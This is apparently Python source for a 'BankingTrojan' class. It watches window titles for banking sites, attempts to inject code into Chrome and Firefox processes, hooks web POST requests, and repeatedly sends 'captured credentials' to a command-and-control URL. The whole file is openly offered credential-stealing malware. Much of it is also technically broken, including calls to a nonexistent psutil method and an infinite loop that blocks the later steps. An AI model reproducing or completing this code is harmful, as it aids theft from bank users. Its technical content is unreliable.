import os
import time
from pygetwindow import getActiveWindow  # pip install pygetwindow
import psutil
import requests

class BankingTrojan:
    def __init__(self, c2_server_url):
        self.c2_server_url = c2_server_url
        self.banking_urls = ['https://bank.example.com', 'http://online-banking.org']

    def get_active_window(self):
        active_window_title = ''
        try:
            active_window_title = getActiveWindow().title
        except Exception as e:
            pass
        return active_window_title

    def poll_process_list(self):
        process_list = []
        for proc in psutil.process_iter(['pid', 'name']):
            process_list.append(proc.info)
        return process_list

    def monitor_browser_usage(self, data=None):
        while True:
            try:
                window_title = self.get_active_window()
                if any(url in window_title for url in self.banking_urls):
                    # Inject code into the browser process
                    payload = 'HijackBrowserProcess()'
                    injected_code = f"import os; os.system('{payload}'); exit()"
                    psutil.Process(os.getpid()).create_lwpid(injected_code)
                time.sleep(10)  # Poll every 10 seconds

            except Exception as e:
                print(e)

    def hijack_browser_process(self):
        while True:
            try:
                process_list = self.poll_process_list()
                for proc in process_list:
                    if 'chrome.exe' in proc['name'] or 'firefox.exe' in proc['name']:
                        process = psutil.Process(proc['pid'])
                        # Hook web traffic
                        hook_script = """
import socket

def hook_web_traffic(url, data):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 9999))
    sock.sendall(f"{url} {data}".encode())
    response = sock.recv(4096).decode()
    return response

def hijack():
    import urllib3
    import requests
    from bs4 import BeautifulSoup

    http = urllib3.PoolManager()

    def hook_urlopen(url, data):
        return hook_web_traffic(url, data)

    def hook_request(method, url, **kwargs):
        if method == 'POST':
            return hook_web_traffic(url, kwargs['data'])

    # Hook requests
    requests.post = hook_request

hijack()
                        """
                        process.create_lwpid(hook_script)
                time.sleep(5)  # Check every 5 seconds

            except Exception as e:
                print(e)

    def exfiltrate_credentials(self):
        while True:
            try:
                data = 'Captured credentials'
                if any(url in self.get_active_window() for url in self.banking_urls):
                    # Exfiltrate credentials
                    requests.post(
                        f'{self.c2_server_url}/credentials',
                        data=data,
                        headers={'Content-Type': 'application/json'}
                    )
            except Exception as e:
                print(e)
            time.sleep(60)  # Exfiltrate every minute

trojan = BankingTrojan('https://example.com/c2')
trojan.monitor_browser_usage()
trojan.hijack_browser_process()
trojan.exfiltrate_credentials()
